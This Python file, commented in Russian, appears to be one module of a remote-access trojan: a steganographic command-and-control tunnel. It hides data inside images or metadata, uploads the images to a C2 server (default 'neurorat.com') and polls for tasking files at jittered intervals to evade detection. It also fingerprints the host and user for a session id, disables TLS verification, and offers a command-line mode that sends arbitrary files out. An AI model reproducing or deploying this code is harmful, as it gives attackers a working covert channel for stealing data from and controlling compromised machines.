#!/usr/bin/env python3
"""
StegoTunnel - Модуль для скрытой связи через стеганографию
Позволяет передавать данные через файлы, скрывая их внутри изображений, аудио и других типов файлов
"""

import os
import time
import random
import threading
import queue
import hashlib
from ..common.utils import get_logger
import logging
import requests
import base64
import tempfile
import json
from typing import Dict, List, Any, Optional, Callable, Tuple, Union

from .steganography import SteganoManager
from . import crypto  # Импортируем модуль криптографии

class StegoTunnel:
    """
    Класс для создания скрытого канала связи через стеганографию
    """
    
    def __init__(
        self,
        c2_host: str = "neurorat.com",
        c2_port: int = 443,
        upload_path: str = "/files/upload",
        download_path: str = "/files/download",
        poll_interval: float = 30.0,
        jitter: float = 0.3,
        stego_method: str = "metadata",
        image_pool: List[str] = None,
        callback: Callable[[bytes], None] = None,
        session_id: str = None
    ):
        """
        Инициализация туннеля стеганографии
        
        Args:
            c2_host: Хост C2-сервера
            c2_port: Порт C2-сервера
            upload_path: Путь для загрузки файлов на сервер
            download_path: Путь для загрузки файлов с сервера
            poll_interval: Интервал опроса сервера (секунды)
            jitter: Случайное отклонение для интервала (0.0-1.0)
            stego_method: Метод стеганографии
            image_pool: Список путей к изображениям-носителям (для outbound)
            callback: Функция обратного вызова для полученных данных
            session_id: Идентификатор сессии (если None, генерируется автоматически)
        """
        # Базовые параметры
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.upload_path = upload_path
        self.download_path = download_path
        self.poll_interval = max(10.0, poll_interval)
        self.jitter = min(max(0.0, jitter), 0.5)
        self.stego_method = stego_method
        self.callback = callback
        self.session_id = session_id or self._generate_session_id()
        
        # Директория для временных файлов
        self.temp_dir = tempfile.mkdtemp(prefix="stego_")
        
        # Инициализация SteganoManager
        self.stegano = SteganoManager()
        
        # Поддерживаемые методы стеганографии
        self.supported_methods = list(method for method, (supported, _) in self.stegano.supported_methods.items() if supported)
        
        # Если указанный метод не поддерживается, выбираем первый доступный
        if self.stego_method not in self.supported_methods and self.supported_methods:
            self.stego_method = self.supported_methods[0]
        
        # Пул изображений-носителей
        self.image_pool = []
        self._load_image_pool(image_pool)
        
        # Очередь для отправки данных
        self.send_queue = queue.Queue()
        
        # Флаги состояния
        self.is_running = False
        self.receive_thread = None
        self.send_thread = None
        
        # Настройка логирования
        self.logger = get_logger("stego_tunnel")
        
        # Статистика
        self.stats = {
            "sent_files": 0,
            "received_files": 0,
            "failed_sends": 0,
            "failed_receives": 0,
            "last_send_time": 0,
            "last_receive_time": 0,
            "bytes_sent": 0,
            "bytes_received": 0
        }
        
        self.logger.info(f"StegoTunnel инициализирован. Метод: {self.stego_method}, Сессия: {self.session_id}")
    
    def _generate_session_id(self) -> str:
        """
        Генерирует уникальный идентификатор сессии
        
        Returns:
            str: Идентификатор сессии
        """
        import uuid
        import socket
        import getpass
        
        # Создаем уникальный идентификатор на основе времени, hostname и случайности
        seed = f"{time.time()}-{socket.gethostname()}-{getpass.getuser()}-{os.getpid()}-{random.random()}"
        return hashlib.md5(seed.encode()).hexdigest()[:12]
    
    def _load_image_pool(self, image_paths: List[str] = None) -> None:
        """
        Загружает пул изображений-носителей
        
        Args:
            image_paths: Список путей к изображениям
        """
        # Очищаем текущий пул
        self.image_pool = []
        
        # Если указаны пути к изображениям, проверяем и добавляем
        if image_paths:
            for path in image_paths:
                if os.path.exists(path) and os.path.isfile(path):
                    self.image_pool.append(path)
        
        # Если пул пустой, создаем дефолтные изображения
        if not self.image_pool:
            try:
                # Создаем несколько изображений разных размеров
                self._create_default_images()
            except Exception as e:
                self.logger.error(f"Ошибка при создании дефолтных изображений: {e}")
        
        self.logger.info(f"Загружено {len(self.image_pool)} изображений-носителей")
    
    def _create_default_images(self, count: int = 5) -> None:
        """
        Создает дефолтные изображения для использования в качестве носителей
        
        Args:
            count: Количество изображений для создания
        """
        try:
            from PIL import Image
            import numpy as np
            
            # Различные размеры изображений
            sizes = [(800, 600), (1024, 768), (640, 480), (1280, 720), (320, 240)]
            
            for i in range(min(count, len(sizes))):
                # Создаем новое изображение со случайным цветным шумом
                width, height = sizes[i]
                img_array = np.random.randint(0, 256, (height, width, 3), dtype=np.uint8)
                
                # Создаем изображение из массива
                img = Image.fromarray(img_array)
                
                # Сохраняем изображение
                img_path = os.path.join(self.temp_dir, f"carrier_{i+1}.png")
                img.save(img_path)
                
                # Добавляем в пул
                self.image_pool.append(img_path)
        
        except Exception as e:
            self.logger.error(f"Ошибка при создании дефолтных изображений: {e}")
            raise
    
    def _select_carrier(self) -> str:
        """
        Выбирает файл-носитель из доступного пула
        
        Returns:
            str: Путь к файлу-носителю
        """
        if not self.image_pool:
            raise RuntimeError("Нет доступных файлов-носителей")
        
        return random.choice(self.image_pool)
    
    def _upload_file(self, file_path: str) -> bool:
        """
        Загружает файл на C2-сервер
        
        Args:
            file_path: Путь к файлу для загрузки
            
        Returns:
            bool: True в случае успеха, False в случае ошибки
        """
        try:
            # Подготавливаем URL для загрузки
            url = f"https://{self.c2_host}:{self.c2_port}{self.upload_path}"
            
            # Подготавливаем параметры
            params = {
                "session": self.session_id,
                "type": "stego",
                "timestamp": int(time.time())
            }
            
            # Загружаем файл
            with open(file_path, 'rb') as f:
                files = {'file': f}
                response = requests.post(url, params=params, files=files, verify=False)
            
            # Проверяем результат
            if response.status_code == 200:
                self.logger.info(f"Файл {file_path} успешно загружен")
                return True
            else:
                self.logger.warning(f"Ошибка загрузки файла: {response.status_code} - {response.text}")
                return False
        
        except Exception as e:
            self.logger.error(f"Ошибка при загрузке файла: {e}")
            return False
    
    def _download_files(self) -> List[str]:
        """
        Загружает файлы с C2-сервера
        
        Returns:
            List[str]: Список путей к загруженным файлам
        """
        try:
            # Подготавливаем URL для скачивания
            url = f"https://{self.c2_host}:{self.c2_port}{self.download_path}"
            
            # Подготавливаем параметры
            params = {
                "session": self.session_id,
                "type": "stego",
                "timestamp": int(time.time())
            }
            
            # Отправляем запрос
            response = requests.get(url, params=params, verify=False)
            
            # Проверяем результат
            if response.status_code != 200:
                self.logger.warning(f"Ошибка загрузки файлов: {response.status_code} - {response.text}")
                return []
            
            # Пытаемся получить список файлов
            try:
                files_info = response.json()
            except:
                self.logger.warning("Не удалось получить список файлов (неверный формат JSON)")
                return []
            
            downloaded_files = []
            
            # Загружаем каждый файл
            for file_info in files_info:
                try:
                    file_url = file_info.get("url")
                    file_id = file_info.get("id")
                    
                    if not file_url:
                        continue
                    
                    # Скачиваем файл
                    file_response = requests.get(file_url, verify=False)
                    
                    if file_response.status_code != 200:
                        continue
                    
                    # Сохраняем файл
                    file_path = os.path.join(self.temp_dir, f"download_{file_id}.dat")
                    with open(file_path, 'wb') as f:
                        f.write(file_response.content)
                    
                    downloaded_files.append(file_path)
                    
                    # Удаляем файл с сервера (ack)
                    if file_id:
                        ack_url = f"https://{self.c2_host}:{self.c2_port}/files/ack"
                        requests.post(ack_url, params={"id": file_id}, verify=False)
                
                except Exception as e:
                    self.logger.error(f"Ошибка при загрузке файла: {e}")
            
            self.logger.info(f"Загружено файлов: {len(downloaded_files)}")
            return downloaded_files
        
        except Exception as e:
            self.logger.error(f"Ошибка при загрузке файлов: {e}")
            return []
    
    def _process_downloaded_files(self, file_paths: List[str]) -> None:
        """
        Обрабатывает загруженные файлы, извлекая скрытые данные
        
        Args:
            file_paths: Список путей к файлам
        """
        for file_path in file_paths:
            try:
                # Извлекаем данные из файла
                data = self.stegano.extract_data(
                    method=self.stego_method,
                    carrier_file=file_path
                )
                
                self.stats["bytes_received"] += len(data)
                self.stats["received_files"] += 1
                self.stats["last_receive_time"] = time.time()
                
                # Вызываем callback-функцию с полученными данными
                if self.callback and callable(self.callback):
                    self.callback(data)
            
            except Exception as e:
                self.logger.error(f"Ошибка при извлечении данных из файла {file_path}: {e}")
                self.stats["failed_receives"] += 1
            
            finally:
                # Удаляем временный файл
                try:
                    os.remove(file_path)
                except:
                    pass
    
    def _send_data(self, data: bytes) -> bool:
        """
        Отправляет данные через стеганографию
        
        Args:
            data: Данные для отправки
            
        Returns:
            bool: True в случае успеха, False в случае ошибки
        """
        try:
            # Выбираем файл-носитель
            carrier_file = self._select_carrier()
            
            # Генерируем имя для выходного файла
            output_file = os.path.join(self.temp_dir, f"stego_{int(time.time())}_{random.randint(1000, 9999)}.dat")
            
            # Скрываем данные в файле-носителе
            result_file = self.stegano.hide_data(
                method=self.stego_method,
                data=data,
                carrier_file=carrier_file,
                output_file=output_file
            )
            
            # Загружаем файл на сервер
            if self._upload_file(result_file):
                self.stats["bytes_sent"] += len(data)
                self.stats["sent_files"] += 1
                self.stats["last_send_time"] = time.time()
                
                # Удаляем временный файл
                try:
                    os.remove(result_file)
                except:
                    pass
                
                return True
            else:
                self.stats["failed_sends"] += 1
                return False
        
        except Exception as e:
            self.logger.error(f"Ошибка при отправке данных: {e}")
            self.stats["failed_sends"] += 1
            return False
    
    def _receive_loop(self) -> None:
        """
        Поток для приема данных с сервера
        """
        while self.is_running:
            try:
                # Добавляем джиттер к интервалу опроса
                jitter_value = self.poll_interval * random.uniform(-self.jitter, self.jitter)
                interval = max(1.0, self.poll_interval + jitter_value)
                
                # Скачиваем файлы с сервера
                downloaded_files = self._download_files()
                
                # Обрабатываем скачанные файлы
                if downloaded_files:
                    self._process_downloaded_files(downloaded_files)
                
                # Ждем перед следующим опросом
                time.sleep(interval)
            
            except Exception as e:
                self.logger.error(f"Ошибка в цикле приема: {e}")
                # Короткая пауза перед повторной попыткой
                time.sleep(5)
    
    def _send_loop(self) -> None:
        """
        Поток для отправки данных на сервер
        """
        while self.is_running:
            try:
                # Получаем данные из очереди (блокирующий вызов с таймаутом)
                try:
                    data = self.send_queue.get(timeout=1.0)
                except queue.Empty:
                    continue
                
                # Отправляем данные
                success = self._send_data(data)
                
                # Помечаем задачу как выполненную
                self.send_queue.task_done()
                
                # Если отправка не удалась, добавляем обратно в очередь
                if not success:
                    self.logger.warning("Отправка не удалась, добавляем обратно в очередь")
                    try:
                        self.send_queue.put(data)
                    except:
                        pass
                
                # Добавляем случайную задержку для имитации реальной активности
                time.sleep(random.uniform(0.5, 2.0))
            
            except Exception as e:
                self.logger.error(f"Ошибка в цикле отправки: {e}")
                # Короткая пауза перед повторной попыткой
                time.sleep(1)
    
    def start(self) -> bool:
        """
        Запускает туннель стеганографии
        
        Returns:
            bool: True в случае успеха, False в случае ошибки
        """
        if self.is_running:
            return True
        
        try:
            # Проверяем наличие файлов-носителей
            if not self.image_pool:
                self._load_image_pool()
                
                if not self.image_pool:
                    self.logger.error("Нет доступных файлов-носителей")
                    return False
            
            # Устанавливаем флаг работы
            self.is_running = True
            
            # Запускаем поток приема
            self.receive_thread = threading.Thread(
                target=self._receive_loop,
                daemon=True,
                name="Stego-Receive"
            )
            self.receive_thread.start()
            
            # Запускаем поток отправки
            self.send_thread = threading.Thread(
                target=self._send_loop,
                daemon=True,
                name="Stego-Send"
            )
            self.send_thread.start()
            
            self.logger.info("StegoTunnel запущен")
            return True
        
        except Exception as e:
            self.logger.error(f"Ошибка при запуске туннеля: {e}")
            self.is_running = False
            return False
    
    def stop(self) -> None:
        """
        Останавливает туннель стеганографии
        """
        if not self.is_running:
            return
        
        # Сбрасываем флаг работы
        self.is_running = False
        
        # Ждем завершения потоков (с таймаутом)
        if self.receive_thread and self.receive_thread.is_alive():
            self.receive_thread.join(timeout=3.0)
        
        if self.send_thread and self.send_thread.is_alive():
            self.send_thread.join(timeout=3.0)
        
        # Очищаем очередь отправки
        while not self.send_queue.empty():
            try:
                self.send_queue.get_nowait()
                self.send_queue.task_done()
            except:
                pass
        
        # Удаляем временные файлы
        try:
            import shutil
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except:
            pass
        
        self.logger.info("StegoTunnel остановлен")
    
    def send(self, data: bytes) -> bool:
        """
        Добавляет данные в очередь на отправку
        
        Args:
            data: Данные для отправки
            
        Returns:
            bool: True в случае успеха, False в случае ошибки
        """
        if not self.is_running:
            self.logger.error("Невозможно отправить данные: туннель не запущен")
            return False
        
        try:
            # Добавляем данные в очередь отправки
            self.send_queue.put(data)
            return True
        
        except Exception as e:
            self.logger.error(f"Ошибка при добавлении данных в очередь: {e}")
            return False
    
    def get_statistics(self) -> Dict[str, Any]:
        """
        Возвращает статистику работы туннеля
        
        Returns:
            Dict: Статистика работы
        """
        # Копируем базовую статистику
        stats = dict(self.stats)
        
        # Добавляем дополнительную информацию
        stats.update({
            "is_running": self.is_running,
            "queue_size": self.send_queue.qsize(),
            "stego_method": self.stego_method,
            "session_id": self.session_id,
            "carriers_count": len(self.image_pool),
            "uptime": time.time() - stats.get("start_time", time.time()) if self.is_running else 0
        })
        
        return stats


if __name__ == "__main__":
    # Пример использования
    import argparse
    import sys
    
    # Настройка логирования
    logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
    
    # Парсинг аргументов командной строки
    parser = argparse.ArgumentParser(description="StegoTunnel - Туннель для скрытой связи через стеганографию")
    parser.add_argument("--host", default="neurorat.com", help="C2-сервер (хост)")
    parser.add_argument("--port", type=int, default=443, help="C2-сервер (порт)")
    parser.add_argument("--method", default="metadata", choices=["lsb_image", "lsb_audio", "metadata", "eof"], 
                       help="Метод стеганографии")
    parser.add_argument("--send", help="Текст для отправки")
    parser.add_argument("--send-file", help="Файл для отправки")
    parser.add_argument("--poll-interval", type=float, default=30.0, help="Интервал опроса сервера (секунды)")
    parser.add_argument("--image-pool", nargs="+", help="Список путей к изображениям-носителям")
    
    args = parser.parse_args()
    
    # Создаем и запускаем туннель
    tunnel = StegoTunnel(
        c2_host=args.host,
        c2_port=args.port,
        stego_method=args.method,
        poll_interval=args.poll_interval,
        image_pool=args.image_pool,
        callback=lambda data: print(f"Received data: {data[:100]}...")
    )
    
    if not tunnel.start():
        print("Ошибка при запуске туннеля")
        sys.exit(1)
    
    try:
        # Отправляем данные, если указаны
        if args.send:
            print(f"Отправка текста: {args.send}")
            tunnel.send(args.send.encode('utf-8'))
        
        elif args.send_file:
            with open(args.send_file, 'rb') as f:
                data = f.read()
            print(f"Отправка файла: {args.send_file} ({len(data)} байт)")
            tunnel.send(data)
        
        # Держим туннель активным
        print("Туннель запущен. Нажмите Ctrl+C для завершения")
        while True:
            time.sleep(1)
    
    except KeyboardInterrupt:
        print("Завершение работы...")
    
    finally:
        tunnel.stop() 